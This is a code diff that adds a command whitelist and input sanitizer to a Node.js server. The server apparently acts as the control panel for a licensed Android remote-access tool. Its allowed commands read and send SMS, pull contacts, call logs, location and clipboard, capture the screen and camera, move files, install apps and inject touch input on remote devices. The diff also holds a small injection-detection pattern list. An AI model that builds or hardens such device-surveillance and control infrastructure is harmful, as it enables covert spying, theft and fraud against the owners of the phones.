@@ -2491,6 +2491,60 @@ async function validateEmailHash(emailHash) {
   }
 }
 
+// -------------------- Command Validation (Security Whitelist) --------------------
+// SECURITY: Whitelist of allowed commands to prevent command injection
+const ALLOWED_COMMANDS = [
+  'getinfo', 'getdeviceinfo',
+  'getsms', 'sendsms', 'deletesms',
+  'getapps', 'installapp', 'uninstallapp', 'startapp', 'stopapp',
+  'getfiles', 'uploadfile', 'downloadfile', 'deletefile',
+  'getcontacts', 'getcalls', 'makecall',
+  'getscreen', 'getpreviewimg', 'startcamera', 'stopcamera', 'captureimage',
+  'input', 'tap', 'swipe', 'scroll', 'longpress', 'keyevent',
+  'access-command',
+  'reboot', 'shutdown', 'getbattery', 'getlocation',
+  'getclipboard', 'setclipboard',
+];
+
+function validateCommand(cmd, param) {
+  // Check if command is in whitelist
+  if (!ALLOWED_COMMANDS.includes(cmd)) {
+    throw new Error(`Command '${cmd}' is not allowed. Allowed commands: ${ALLOWED_COMMANDS.join(', ')}`);
+  }
+  
+  // Validate command format
+  if (!/^[a-zA-Z0-9_-]+$/.test(cmd)) {
+    throw new Error(`Command contains invalid characters: ${cmd}`);
+  }
+  
+  // Validate param if provided
+  if (param !== undefined && param !== null) {
+    if (typeof param !== 'string') {
+      throw new Error('Command parameter must be a string');
+    }
+    
+    // Prevent extremely long parameters (DoS protection)
+    if (param.length > 1000) {
+      throw new Error('Command parameter is too long (max 1000 characters)');
+    }
+    
+    // Sanitize param: prevent obvious injection patterns
+    const dangerousPatterns = [
+      /[<>]/g,
+      /javascript:/gi,
+      /on\w+\s*=/gi,
+      /eval\s*\(/gi,
+      /exec\s*\(/gi,
+    ];
+    
+    for (const pattern of dangerousPatterns) {
+      if (pattern.test(param)) {
+        throw new Error(`Command parameter contains potentially dangerous content`);
+      }
+    }
+  }
+}
+
 // -------------------- Send Command via REST API --------------------
 app.post("/api/command/:uuid", async (req, res) => {
   const uuid = req.params.uuid;
@@ -2501,6 +2555,17 @@ app.post("/api/command/:uuid", async (req, res) => {
 
   if (!cmd) {
     return res.status(400).json({ error: "Missing cmd" });
+  }
+
+  // SECURITY: Validate command against whitelist
+  try {
+    validateCommand(cmd, param);
+  } catch (validationError) {
+    console.error(`❌ Command validation failed:`, validationError.message);
+    return res.status(400).json({ 
+      error: "Invalid command",
+      message: validationError.message 
+    });
   }
 
   // Validate License ID format
